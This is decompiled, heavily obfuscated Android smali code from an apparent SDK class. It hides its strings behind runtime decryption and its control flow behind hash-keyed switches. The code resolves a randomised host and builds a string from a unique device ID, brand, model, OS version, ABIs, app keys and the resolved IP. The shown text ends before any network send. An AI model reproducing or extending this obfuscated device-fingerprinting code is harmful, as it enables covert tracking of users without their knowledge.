.class public LCu7y/sdk/e5;
.super Ljava/lang/Object;


# static fields
.field public static a:Z

.field public static b:Lorg/json/JSONObject;

.field public static c:Z

.field public static final d:Ljava/lang/String;

.field public static final e:Ljava/lang/String;

.field public static final f:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 5

    const/4 v4, 0x0

    const-string v0, "\u06e1\u06e0\u06ec\u06df\u06e7\u06e0\u06d8\u06e5\u06e0\u06e0\u06d9\u06d6\u06e5\u06d7\u06d7\u06db\u06e7\u06e7\u06df\u06db\u06df\u06d6\u06db\u06e1\u06e0\u06d9\u06e2\u06d9\u06d8\u06d8\u06d8\u06e2\u06d6\u06e6\u06e1\u06d7\u06db\u06d6\u06e4\u06e6\u06e8\u06df\u06dc\u06e0\u06d9\u06e1\u06d8\u06dc\u06d9\u06db"

    :goto_0
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v1

    const/16 v2, 0x32f

    xor-int/2addr v1, v2

    xor-int/lit16 v1, v1, 0x3ad

    const/16 v2, 0x3b6

    const v3, 0x41db4af8

    xor-int/2addr v1, v2

    xor-int/2addr v1, v3

    sparse-switch v1, :sswitch_data_0

    goto :goto_0

    :sswitch_0
    const-string v0, "Wm7N4lrsAyBGcs3tQtYX\n"

    const-string v1, "KQaojjazc1I=\n"

    invoke-static {v0, v1}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, LCu7y/sdk/e5;->d:Ljava/lang/String;

    const-string v0, "\u06e0\u06e5\u06e1\u06d6\u06eb\u06d9\u06df\u06d8\u06dc\u06d8\u06d9\u06eb\u06e8\u06d8\u06e4\u06e8\u06e1\u06da\u06e1\u06e8\u06e0\u06db\u06e7\u06db\u06e0\u06e4\u06e1\u06df\u06dc\u06d8\u06da\u06e8\u06d8\u06df\u06d7\u06d7\u06ec\u06e6\u06e1\u06d8\u06ec\u06dc\u06dc\u06db\u06e4\u06d8\u06d8"

    goto :goto_0

    :sswitch_1
    const-string v0, "rLfwY/l65/+fpexi1Gzw\n"

    const-string v1, "wNaDF6YPlZM=\n"

    invoke-static {v0, v1}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, LCu7y/sdk/e5;->e:Ljava/lang/String;

    const-string v0, "\u06e1\u06d8\u06e6\u06d8\u06e1\u06df\u06e1\u06d8\u06db\u06e6\u06e7\u06d9\u06e8\u06eb\u06e1\u06e2\u06db\u06eb\u06eb\u06e2\u06e1\u06db\u06e7\u06eb\u06db\u06d7\u06da\u06da\u06d9\u06e1\u06e1\u06e2\u06ec\u06dc\u06d8\u06e7\u06e5\u06e0\u06df\u06dc\u06e7\u06d8\u06d8\u06e5\u06e2"

    goto :goto_0

    :sswitch_2
    const-string v0, "Ggnq29v0UFYpAffL4fk=\n"

    const-string v1, "dmiZr4SBIjo=\n"

    invoke-static {v0, v1}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, LCu7y/sdk/e5;->f:Ljava/lang/String;

    const-string v0, "\u06dc\u06d6\u06db\u06e6\u06e0\u06e0\u06e2\u06e4\u06d8\u06df\u06e6\u06da\u06e5\u06e1\u06ec\u06e5\u06d8\u06e8\u06ec\u06e8\u06d8\u06df\u06e6\u06d8\u06d9\u06e4\u06e1\u06d8\u06e8\u06eb\u06db\u06e0\u06d6\u06eb\u06d9\u06dc\u06eb\u06e6\u06eb\u06db\u06e5\u06dc\u06e2\u06e0\u06e0\u06e2\u06e4\u06e2\u06d8"

    goto :goto_0

    :sswitch_3
    sput-boolean v4, LCu7y/sdk/e5;->a:Z

    const-string v0, "\u06ec\u06e7\u06e2\u06d8\u06e5\u06dc\u06d8\u06e6\u06e2\u06e5\u06dc\u06e4\u06d7\u06db\u06da\u06e8\u06d8\u06e2\u06e5\u06d8\u06e6\u06eb\u06e8\u06e5\u06e5\u06e4\u06d6\u06d6\u06e5\u06d8\u06e2\u06e5\u06e2\u06e6\u06e6\u06e1\u06d8\u06eb\u06ec\u06d6\u06e5\u06e6\u06e8\u06ec\u06db"

    goto :goto_0

    :sswitch_4
    const/4 v0, 0x0

    sput-object v0, LCu7y/sdk/e5;->b:Lorg/json/JSONObject;

    const-string v0, "\u06e0\u06d9\u06e2\u06d8\u06d7\u06d8\u06d8\u06d6\u06d9\u06ec\u06db\u06e6\u06e5\u06d8\u06e1\u06eb\u06e5\u06e1\u06e4\u06d9\u06d7\u06e1\u06d9\u06dc\u06e1\u06ec\u06e1\u06e4\u06e5\u06d8\u06d6\u06db\u06d8\u06ec\u06eb\u06e4\u06d6\u06e7\u06da\u06db\u06e2\u06d6\u06db\u06e5\u06d6\u06df\u06e4\u06e5\u06d8\u06e1\u06e1\u06ec\u06e0\u06d7\u06db\u06e7\u06da\u06ec"

    goto :goto_0

    :sswitch_5
    sput-boolean v4, LCu7y/sdk/e5;->c:Z

    const-string v0, "\u06e1\u06da\u06e8\u06d8\u06dc\u06da\u06d7\u06e5\u06d9\u06dc\u06d8\u06e5\u06d9\u06e6\u06d8\u06d8\u06e7\u06d6\u06d8\u06e5\u06dc\u06eb\u06d8\u06ec\u06e0\u06d9\u06ec\u06db\u06df\u06e8\u06e6\u06db\u06e0\u06d7\u06d8\u06e4\u06d7\u06e6\u06e4\u06e2\u06da\u06db\u06e4\u06d7\u06da\u06eb\u06d7\u06e8\u06d9\u06ec\u06dc\u06d8\u06d9\u06db\u06d8\u06e4\u06e2\u06e8\u06d8"

    goto :goto_0

    :sswitch_6
    return-void

    nop

    :sswitch_data_0
    .sparse-switch
        -0x223fab38 -> :sswitch_2
        -0x1cf15b4d -> :sswitch_1
        -0x98841fa -> :sswitch_0
        0xa80069f -> :sswitch_4
        0x1fb15134 -> :sswitch_6
        0x29712b71 -> :sswitch_5
        0x4ce2ed36 -> :sswitch_3
    .end sparse-switch
.end method

.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static synthetic a([I[Ljava/lang/String;[ILandroid/content/Context;[ILandroid/content/SharedPreferences;[Ljava/lang/String;[Z[ZZ[I)V
    .locals 18

    const-string v2, ""

    move-object v3, v2

    :goto_0
    const v4, 0x2d0425b3

    const-string v2, "\u06d6\u06d8\u06e8\u06d7\u06d8\u06e1\u06db\u06e7\u06eb\u06dc\u06dc\u06d8\u06e1\u06dc\u06e4\u06df\u06eb\u06d8\u06d8\u06eb\u06e0\u06e1\u06d8\u06e0\u06db\u06d8\u06d8\u06d7\u06d8\u06d6\u06e2\u06e6\u06d9\u06dc\u06eb\u06e0\u06d7\u06eb\u06d8"

    :goto_1
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v5

    xor-int/2addr v5, v4

    sparse-switch v5, :sswitch_data_0

    goto :goto_1

    :sswitch_0
    const-string v2, "\u06d8\u06e4\u06df\u06d8\u06df\u06df\u06db\u06d7\u06d6\u06d8\u06e1\u06e4\u06e5\u06d8\u06d8\u06d9\u06da\u06d7\u06eb\u06e5\u06d8\u06e0\u06e5\u06e1\u06d8\u06d6\u06db\u06ec\u06ec\u06eb\u06da\u06d9\u06ec\u06d6\u06d8\u06db\u06d7\u06e8\u06d8\u06d9\u06d8\u06dc\u06d8\u06e4\u06ec\u06dc\u06e5\u06e0\u06db\u06eb\u06e1\u06d8\u06eb\u06e4\u06e0\u06ec\u06dc\u06e5\u06e8\u06d8\u06eb"

    goto :goto_1

    :sswitch_1
    const-string v2, "\u06e6\u06e2\u06e2\u06e1\u06df\u06e7\u06d7\u06db\u06dc\u06ec\u06d6\u06e1\u06ec\u06df\u06e8\u06d8\u06e2\u06dc\u06e6\u06e4\u06eb\u06db\u06d6\u06e0\u06da\u06e2\u06e4\u06d6\u06d8\u06e5\u06e0\u06dc\u06d8"

    goto :goto_1

    :sswitch_2
    const v5, -0x19e069e8

    const-string v2, "\u06e4\u06e6\u06e0\u06e7\u06e6\u06eb\u06da\u06eb\u06d6\u06d8\u06e7\u06e2\u06e5\u06d8\u06e2\u06dc\u06d7\u06e1\u06e2\u06db\u06e7\u06dc\u06e0\u06e6\u06e2\u06e8\u06da\u06e6\u06d9\u06e8\u06d9\u06e5\u06d8\u06d6\u06e8\u06ec\u06eb\u06d7\u06d8\u06e0\u06df\u06da\u06d9"

    :goto_2
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v6

    xor-int/2addr v6, v5

    sparse-switch v6, :sswitch_data_1

    goto :goto_2

    :sswitch_3
    const/4 v2, 0x0

    aget v2, p0, v2

    if-nez v2, :cond_0

    const-string v2, "\u06e2\u06d9\u06e6\u06d8\u06d7\u06e7\u06dc\u06e2\u06e0\u06e7\u06e7\u06d9\u06e5\u06db\u06d7\u06eb\u06ec\u06ec\u06e6\u06d8\u06e0\u06d8\u06e0\u06e7\u06d9\u06db\u06e5\u06d9\u06dc\u06dc\u06e5\u06d8\u06ec\u06e4\u06e8\u06e2\u06e5\u06eb\u06ec\u06e5\u06e4\u06d7\u06ec\u06e6\u06d8\u06dc\u06e5\u06d6\u06d8\u06e2\u06e4\u06e5\u06e6\u06df\u06e8\u06d8\u06e7\u06ec\u06df"

    goto :goto_2

    :cond_0
    const-string v2, "\u06e8\u06eb\u06d8\u06e4\u06dc\u06e5\u06d8\u06da\u06e5\u06e4\u06e1\u06d7\u06e6\u06d8\u06e7\u06d9\u06e5\u06d8\u06d9\u06e1\u06e6\u06d8\u06d9\u06df\u06e1\u06d8\u06d6\u06d8\u06d8\u06e6\u06db\u06eb\u06dc\u06e0\u06d9\u06e5\u06ec\u06df\u06d6\u06e1\u06d8\u06e7\u06eb\u06e4\u06ec\u06e4\u06e5\u06d9\u06d8\u06d9\u06e1\u06e7\u06d9\u06df\u06d8\u06e4\u06df\u06e8\u06dc"

    goto :goto_2

    :sswitch_4
    const-string v2, "\u06d8\u06da\u06e2\u06da\u06dc\u06e5\u06e2\u06da\u06dc\u06e4\u06e5\u06e6\u06da\u06dc\u06d8\u06dc\u06e8\u06d6\u06eb\u06e5\u06d8\u06d7\u06dc\u06e5\u06e8\u06eb\u06e8\u06d8\u06e7\u06e2\u06d8\u06d8\u06eb\u06eb\u06eb\u06e0\u06e0\u06e7\u06db\u06df\u06e8\u06d8\u06df\u06dc\u06da\u06d9\u06d7\u06e5\u06d8\u06d7\u06db\u06e2"

    goto :goto_2

    :sswitch_5
    const-string v2, "\u06da\u06da\u06dc\u06d8\u06e5\u06e8\u06dc\u06ec\u06e2\u06e1\u06db\u06df\u06ec\u06d7\u06e8\u06e8\u06dc\u06e7\u06d8\u06ec\u06d9\u06db\u06e8\u06e5\u06e5\u06db\u06eb\u06e2\u06e6\u06e1\u06e5\u06e8\u06df\u06dc\u06da\u06d9"

    goto :goto_1

    :sswitch_6
    const/4 v2, 0x0

    aget v2, p2, v2

    aget-object v2, p1, v2

    :goto_3
    const v5, -0x1ccefce3

    const-string v4, "\u06e0\u06d9\u06e0\u06dc\u06dc\u06ec\u06e5\u06e2\u06e1\u06d8\u06e1\u06d7\u06ec\u06dc\u06db\u06e4\u06e8\u06d6\u06da\u06e6\u06db\u06dc\u06e4\u06e7\u06e1\u06d8\u06da\u06e4\u06e2\u06d8\u06e5\u06db\u06da\u06d6\u06e2\u06e5\u06e0\u06e1\u06d8\u06e8\u06df\u06e7\u06e2\u06e4\u06e6\u06d8\u06ec\u06db\u06dc\u06eb\u06d7\u06e6\u06d8\u06e0\u06db\u06e8\u06d8\u06e8\u06d8\u06db"

    :goto_4
    invoke-virtual {v4}, Ljava/lang/String;->hashCode()I

    move-result v6

    xor-int/2addr v6, v5

    sparse-switch v6, :sswitch_data_2

    goto :goto_4

    :sswitch_7
    const v6, -0xa7ee83b

    const-string v4, "\u06e4\u06ec\u06e6\u06d8\u06d8\u06df\u06df\u06e2\u06eb\u06e8\u06e8\u06e4\u06e7\u06dc\u06eb\u06dc\u06db\u06d8\u06da\u06da\u06d7\u06d8\u06e0\u06ec\u06d9\u06e1\u06e7\u06dc\u06e4\u06d9\u06e5\u06d8\u06d9\u06e8\u06dc\u06d8\u06d7\u06e2\u06e6\u06d8\u06ec\u06e7\u06e5\u06da\u06e4\u06e5\u06df\u06dc\u06d6\u06d8\u06dc\u06e8\u06e5\u06d8\u06e2\u06df\u06d6\u06db\u06e4\u06e1"

    :goto_5
    invoke-virtual {v4}, Ljava/lang/String;->hashCode()I

    move-result v7

    xor-int/2addr v7, v6

    sparse-switch v7, :sswitch_data_3

    goto :goto_5

    :sswitch_8
    const-string v4, "\u06d8\u06e2\u06e6\u06d8\u06dc\u06d7\u06ec\u06db\u06df\u06e4\u06ec\u06ec\u06d6\u06da\u06e6\u06e8\u06d8\u06d8\u06df\u06d9\u06e2\u06db\u06e4\u06d6\u06e8\u06e5\u06d8\u06e2\u06e5\u06e4\u06d8\u06e8\u06e1\u06d8"

    goto :goto_4

    :sswitch_9
    sget-object v2, LCu7y/sdk/g0;->a:[Ljava/lang/String;

    const/4 v4, 0x0

    aget v4, p2, v4

    aget-object v2, v2, v4

    goto :goto_3

    :cond_1
    const-string v4, "\u06e8\u06e8\u06e6\u06eb\u06d7\u06d9\u06d7\u06d9\u06d8\u06d9\u06d8\u06e7\u06d8\u06d9\u06da\u06e7\u06e4\u06da\u06d6\u06d7\u06e4\u06e1\u06d8\u06ec\u06e7\u06e6\u06d8\u06d7\u06e0\u06ec\u06e8\u06dc\u06d9"

    goto :goto_5

    :sswitch_a
    const-string v4, "+w==\n"

    const-string v7, "0fKtqcV3tt0=\n"

    invoke-static {v4, v7}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-eqz v4, :cond_1

    const-string v4, "\u06d6\u06e1\u06eb\u06e2\u06d8\u06e6\u06e0\u06d7\u06e8\u06e4\u06dc\u06d6\u06d8\u06e8\u06e7\u06e7\u06db\u06e7\u06e7\u06d8\u06e5\u06d7\u06e6\u06d8\u06d6\u06df\u06db\u06e1\u06d8\u06eb\u06e1\u06e5\u06d8\u06db\u06e7\u06e6\u06d8\u06e5\u06e6\u06d7"

    goto :goto_5

    :sswitch_b
    const-string v4, "\u06d7\u06dc\u06e6\u06d8\u06df\u06e1\u06d8\u06d8\u06ec\u06dc\u06d8\u06e6\u06db\u06d8\u06d8\u06d6\u06e5\u06db\u06d7\u06ec\u06e8\u06d6\u06d8\u06dc\u06ec\u06e2\u06e0\u06da\u06e1\u06db\u06dc\u06e1\u06e5\u06dc\u06e8\u06dc\u06d8\u06dc\u06e4\u06d9\u06e6\u06e1\u06e8\u06d7\u06e5\u06dc\u06e8\u06e5\u06e1\u06d8\u06d8\u06e1\u06da"

    goto :goto_5

    :sswitch_c
    const-string v4, "\u06df\u06db\u06d7\u06d7\u06d7\u06e5\u06db\u06df\u06d8\u06e1\u06d6\u06db\u06d9\u06d7\u06d7\u06e4\u06d7\u06e6\u06d7\u06e2\u06d6\u06e0\u06d9\u06df\u06e0\u06e0\u06d6\u06d8\u06dc\u06d8\u06dc\u06d8"

    goto :goto_4

    :sswitch_d
    const-string v4, "\u06db\u06dc\u06e1\u06db\u06d6\u06e4\u06d9\u06e2\u06d9\u06e4\u06e1\u06d7\u06db\u06e0\u06e6\u06d6\u06e5\u06d8\u06d6\u06e8\u06e7\u06d8\u06da\u06df\u06d8\u06d8\u06db\u06e0\u06e4\u06e5\u06d8\u06df\u06d6\u06e4\u06e6\u06d8\u06e7\u06d8\u06e1\u06d8\u06e4\u06e1\u06da\u06e8\u06e7\u06e4\u06e4\u06e8\u06e2\u06e0\u06d7\u06eb"

    goto :goto_4

    :sswitch_e
    const-string v4, "VQ==\n"

    const-string v5, "f2g/LWShdWA=\n"

    invoke-static {v4, v5}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {}, Lapi/repository/Utils;->generateRandomString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v2, v4, v5}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v2

    move-object v6, v2

    :goto_6
    :try_start_0
    new-instance v2, Ljava/net/URL;

    invoke-direct {v2, v6}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/net/URL;->getHost()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Ljava/net/InetAddress;->getAllByName(Ljava/lang/String;)[Ljava/net/InetAddress;

    move-result-object v4

    const v5, -0x2c33788a

    const-string v2, "\u06e1\u06d9\u06e6\u06d8\u06e2\u06e0\u06eb\u06e0\u06d6\u06d6\u06d9\u06db\u06e8\u06e1\u06e5\u06d6\u06d8\u06e0\u06e7\u06d7\u06e1\u06ec\u06e6\u06d8\u06e7\u06e5\u06e8\u06e4\u06e6\u06d9\u06da\u06eb\u06e0\u06e7\u06df\u06e2\u06d9\u06e7\u06eb\u06eb\u06e1\u06ec\u06e2\u06d6\u06e0\u06d6\u06df\u06db\u06e6\u06d8\u06e6\u06d8\u06e2\u06d7\u06d8\u06d8\u06e4\u06e8\u06db"

    :goto_7
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v7

    xor-int/2addr v7, v5

    sparse-switch v7, :sswitch_data_4

    goto :goto_7

    :sswitch_f
    const/4 v2, 0x0

    aget-object v2, v4, v2

    invoke-virtual {v2}, Ljava/net/InetAddress;->getHostAddress()Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v2

    :try_start_1
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "BQ6sKGd5D6axVbBsOnjbobJSq1U=\n"

    const-string v7, "4r0Xz9zmS+g=\n"

    invoke-static {v5, v7}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    const-string v5, "4iItHA==\n"

    const-string v7, "i0xLc0yNX2Y=\n"

    invoke-static {v5, v7}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v4, v5}, LCu7y/sdk/x7;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_c

    :goto_8
    :try_start_2
    invoke-virtual/range {p3 .. p3}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v4

    invoke-virtual/range {p3 .. p3}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v7

    const/4 v5, 0x0

    invoke-virtual {v7, v4, v5}, Landroid/content/pm/PackageManager;->getPackageInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;

    move-result-object v5

    iget-object v8, v5, Landroid/content/pm/PackageInfo;->versionName:Ljava/lang/String;

    iget v5, v5, Landroid/content/pm/PackageInfo;->versionCode:I

    invoke-static/range {p3 .. p3}, Lapi/repository/Utils;->getUniqueDeviceId(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v9

    sget-object v10, Landroid/os/Build;->BRAND:Ljava/lang/String;

    sget-object v11, Landroid/os/Build;->MODEL:Ljava/lang/String;

    sget-object v12, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    sget v13, Landroid/os/Build$VERSION;->SDK_INT:I

    const-string v14, "ow==\n"

    const-string v15, "j23w04HYIj8=\n"

    invoke-static {v14, v15}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    sget-object v15, Landroid/os/Build;->SUPPORTED_ABIS:[Ljava/lang/String;

    invoke-static {v14, v15}, Landroid/text/TextUtils;->join(Ljava/lang/CharSequence;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v14

    new-instance v15, Ljava/lang/StringBuilder;

    invoke-direct {v15}, Ljava/lang/StringBuilder;-><init>()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_9

    :try_start_3
    const-string v16, "5lRSqDdo7BI=\n"

    const-string v17, "ljUxw1YPiS8=\n"

    invoke-static/range {v16 .. v17}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v16

    invoke-virtual/range {v15 .. v16}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, "i5nZVuDTvzbygd1J9oc=\n"

    const-string v16, "re+8JJO60Fg=\n"

    move-object/from16 v0, v16

    invoke-static {v4, v0}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v15, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, "qi2lIedrjUrTOK838T8=\n"

    const-string v8, "jFvAU5QC4iQ=\n"

    invoke-static {v4, v8}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v15, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v4, "dR606RdaIg==\n"

    const-string v5, "U3/EmX4+H5U=\n"

    invoke-static {v4, v5}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v15, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v4, Lcom/zyyad/gamf/kXEoVYTwnQIy;->APP_ID:Ljava/lang/String;

    invoke-virtual {v15, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, "3TkpoDc38jQ=\n"

    const-string v5, "+1hZ0FxSiwk=\n"

    invoke-static {v4, v5}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v15, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v4, Lcom/zyyad/gamf/kXEoVYTwnQIy;->APP_KEY:Ljava/lang/String;

    invoke-virtual {v15, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, "rN6RMgE=\n"

    const-string v5, "irX0Szxipbs=\n"

    invoke-static {v4, v5}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v15, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v4, Lcom/zyyad/gamf/kXEoVYTwnQIy;->KEY:Ljava/lang/String;

    invoke-virtual {v15, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, "gw74aPk=\n"

    const-string v5, "pWqRDMRTiyI=\n"

    invoke-static {v4, v5}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v15, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, "vPBysNMc5Rz+7Xiczgm1\n"

    const-string v5, "moMLw6d5iEM=\n"

    invoke-static {v4, v5}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v15, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "NcMxSYV0tGR2wipFhnbW\n"

    const-string v4, "E7BZLOkY6xI=\n"

    invoke-static {v2, v4}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v15, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "nVjK\n"

    const-string v4, "rG3zQLKL2AA=\n"

    invoke-static {v2, v4}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v15, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "HSjB9m7UnQ==\n"

    const-string v4, "O0qzlwCwoCU=\n"

    invoke-static {v2, v4}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v15, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "9I0/L8Hy2Q==\n"

    const-string v4, "0uBQS6Se5Dk=\n"

    invoke-static {v2, v4}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v15, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "pyVTL7XbngPeMlg5tN2YCbw=\n"

    const-string v4, "gUQ9S8e092c=\n"

    invoke-static {v2, v4}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v15, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "Zbd1ncYGhDh+\n"

    const-string v4, "Q8QR9plv6kw=\n"

    invoke-static {v2, v4}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v15, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15, v13}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v2, "W1tuXk0=\n"

    const-string v4, "fToMN3B+gHw=\n"

    invoke-static {v2, v4}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v15, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v2, Lcom/zyyad/gamf/kXEoVYTwnQIy;->DNS_POOL:Ljava/lang/String;

    const-string v4, "DmWn8O5IAg==\n"

    const-string v5, "VUbjvr1rXyE=\n"

    invoke-static {v4, v5}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v2, v4}, Lj$/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v5

    const/4 v4, -0x1

    const v10, -0x66b98f77

    const-string v2, "\u06d7\u06e5\u06ec\u06d7\u06ec\u06da\u06eb\u06e7\u06e6\u06d9\u06e6\u06ec\u06eb\u06db\u06df\u06dc\u06e6\u06e5\u06d8\u06df\u06e5\u06e1\u06d8\u06eb\u06db\u06e6\u06d8\u06e2\u06e5\u06e8\u06e4\u06ec\u06e7\u06e7\u06df\u06dc\u06d8\u06eb\u06df\u06d7\u06d6\u06e6\u06ec\u06da\u06d8\u06eb"

    :goto_9
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_4

    move-result v11

    xor-int/2addr v11, v10

    sparse-switch v11, :sswitch_data_5

    goto :goto_9

    :sswitch_10
    move v2, v4

    :goto_a
    :sswitch_11
    const/4 v4, 0x0

    move v5, v2

    :goto_b
